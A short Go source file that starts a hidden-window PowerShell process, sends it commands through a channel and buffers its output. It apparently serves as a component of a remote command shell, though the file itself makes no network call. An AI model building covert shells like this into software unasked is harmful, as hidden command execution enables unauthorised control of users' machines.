package main

import (
	"bytes"
	"os/exec"
	"syscall"
)

type CmdIo struct {
	cmd *exec.Cmd
	in  chan []byte
	out *bytes.Buffer
}

func NewCmdIo() *CmdIo {
	ps := exec.Command("powershell.exe")
	var out_buf bytes.Buffer
	a := &CmdIo{
		cmd: ps,
		in:  make(chan []byte),
		out: &out_buf,
	}
	ps.Stdin = a
	ps.Stdout = &out_buf
	ps.Stderr = &out_buf
	ps.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ps.Start()
	//go ps.Wait()
	return a
}

func (t *CmdIo) Read(p []byte) (n int, err error) {
	temp := <-t.in
	n = copy(p, temp)
	return n, nil
}
func (t *CmdIo) Send(p string) {
	t.in <- []byte(p)
}

// func (t *CmdIo) Recv() {
// 	for {
// 		time.Sleep(time.Second)
// 		if t.out.Len() != 0 {
// 			t.out.WriteTo(t.stdout)
// 		}
// 	}
// }

//输出存在buffer中,Send发送指令
// func main() {
// 	shell := NewCmdIo(os.Stdout)
// 	for {
// 		fmt.Scan()
// 		cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
// 		shell.Send(cmd)
// 	}

// }
